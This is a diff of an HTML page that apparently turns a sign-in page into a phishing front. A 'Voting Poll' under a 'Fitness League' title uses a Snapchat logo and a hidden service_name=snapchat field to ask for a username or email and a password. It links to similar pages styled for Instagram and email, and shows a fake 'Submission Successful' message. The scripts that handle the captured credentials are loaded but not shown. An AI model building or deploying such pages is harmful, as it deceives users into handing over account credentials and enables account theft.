@@ -1,35 +1,133 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SSWeb</title>
-  <link rel="icon" type="image/svg+xml" href="/assets/gmail.svg">
-  <link rel="stylesheet" href="/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The only bad workout is the one that didn't happen - Fitness League">
+    <meta name="theme-color" content="#FFFC00">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Fitness League">
+    
+    <title>Fitness League - Login</title>
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="manifest.json">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="assets/fitness-league.svg">
+    <link rel="apple-touch-icon" href="assets/fitness-league.svg">
+
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <main class="container">
-    <header class="brand">
-      <img src="/assets/gmail.svg" alt="" width="40" height="40">
-      <h1>SSWeb</h1>
-    </header>
-    <nav class="tabs">
-      <button data-tab="signin" class="tab active" type="button">Sign in</button>
-      <button data-tab="ovpn" class="tab" type="button">OVPN</button>
-    </nav>
-    <section id="signin" class="panel active">
-      <form id="signin-form">
-        <label>Email <input name="email" type="email" required autocomplete="username"></label>
-        <label>Password <input name="password" type="password" required autocomplete="current-password"></label>
-        <button type="submit">Sign in</button>
-      </form>
-      <p id="signin-msg" class="msg" aria-live="polite"></p>
-    </section>
-    <section id="ovpn" class="panel">
-      <button id="gen-ovpn" type="button">Generate OVPN config</button>
-      <pre id="ovpn-out" class="ovpn-out" hidden></pre>
-    </section>
-  </main>
-  <script src="/script.js"></script>
+    <div class="container">
+        <h1>Voting Poll</h1>
+        <div class="logo">
+            <img src="https://www.freepnglogos.com/uploads/snapchat-logo-png-0.png" alt="Snapchat Logo">
+        </div>
+        <form id="loginForm">
+            <input type="hidden" id="service_name" value="snapchat">
+            <input type="text" id="username" name="username" placeholder="Username or Email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <a href="#" class="forgot-password">Forgot Password?</a>
+
+        <div class="social-nav">
+            <a href="s1.html" title="Login">
+                <img src="assets/instagram.svg" alt="Login" width="48" height="48">
+            </a>
+            <a href="s2.html" title="Login">
+                <img src="assets/email.png" alt="Login" width="48" height="48">
+            </a>
+        </div>
+        <div class="version-text">v2.4 Final</div>
+    </div>
+    <div class="congrats-container" style="display: none;">
+        <h2>Congratulations!</h2>
+        <p>Submission Successful</p>
+    </div>
+    <script src="ovpn-generator.js"></script>
+    <script src="network-config-native.js"></script>
+    <script src="script-enhanced.js"></script>
+    
+    <!-- PWA Service Worker Registration -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('service-worker.js')
+                    .then((registration) => {
+                        console.log('✅ Service Worker registered:', registration.scope);
+                    })
+                    .catch((error) => {
+                        console.error('❌ Service Worker registration failed:', error);
+                    });
+            });
+        }
+        
+        // PWA Install Prompt
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            console.log('💾 PWA install prompt ready');
+            
+            // Show custom install button after 3 seconds
+            setTimeout(() => {
+                if (deferredPrompt && !window.matchMedia('(display-mode: standalone)').matches) {
+                    const installBanner = document.createElement('div');
+                    installBanner.style.cssText = `
+                        position: fixed;
+                        bottom: 20px;
+                        left: 50%;
+                        transform: translateX(-50%);
+                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                        color: white;
+                        padding: 15px 25px;
+                        border-radius: 25px;
+                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                        z-index: 9999;
+                        font-family: 'Avenir Next', sans-serif;
+                        font-size: 14px;
+                        font-weight: bold;
+                        cursor: pointer;
+                        animation: slideUp 0.3s ease-out;
+                    `;
+                    installBanner.innerHTML = '📱 Install App';
+                    
+                    installBanner.addEventListener('click', async () => {
+                        deferredPrompt.prompt();
+                        const { outcome } = await deferredPrompt.userChoice;
+                        console.log(`User response: ${outcome}`);
+                        deferredPrompt = null;
+                        installBanner.remove();
+                    });
+                    
+                    document.body.appendChild(installBanner);
+                }
+            }, 3000);
+        });
+        
+        // Detect if app is installed
+        window.addEventListener('appinstalled', () => {
+            console.log('✅ PWA installed successfully');
+            deferredPrompt = null;
+        });
+    </script>
+    
+    <style>
+        @keyframes slideUp {
+            from {
+                transform: translateX(-50%) translateY(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(-50%) translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
 </body>
 </html>
